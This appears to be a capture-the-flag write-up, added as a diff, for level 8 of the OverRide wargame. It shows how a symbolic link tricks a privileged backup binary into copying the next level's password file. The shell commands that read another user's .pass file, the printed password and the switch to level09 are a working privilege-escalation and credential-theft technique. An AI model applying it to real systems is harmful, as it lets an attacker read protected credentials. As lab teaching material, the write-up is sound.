@@ -1,0 +1,19 @@
+For this level, we have a x64 binary, who ask for one parameters (a file) to read.
+And we have a folder named "backups" with a .log file in it (we can run it but its useless)
+When we pass a file, he will wrote the process in the .log, and if it succeed,
+he will copy the file in backups/.
+
+So, we can just put a symbolic link to the .pass of the level 9, pass the link
+to the bin, and we have the flag in the backups folder.
+
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -s /home/users/level09/.pass toto
+level08@OverRide:~$ ./level08 toto
+level08@OverRide:~$ cat backups/toto
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+level08@OverRide:~$ su level09
+Password:
+\RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
+level09@OverRide:~$ whoami
+level09
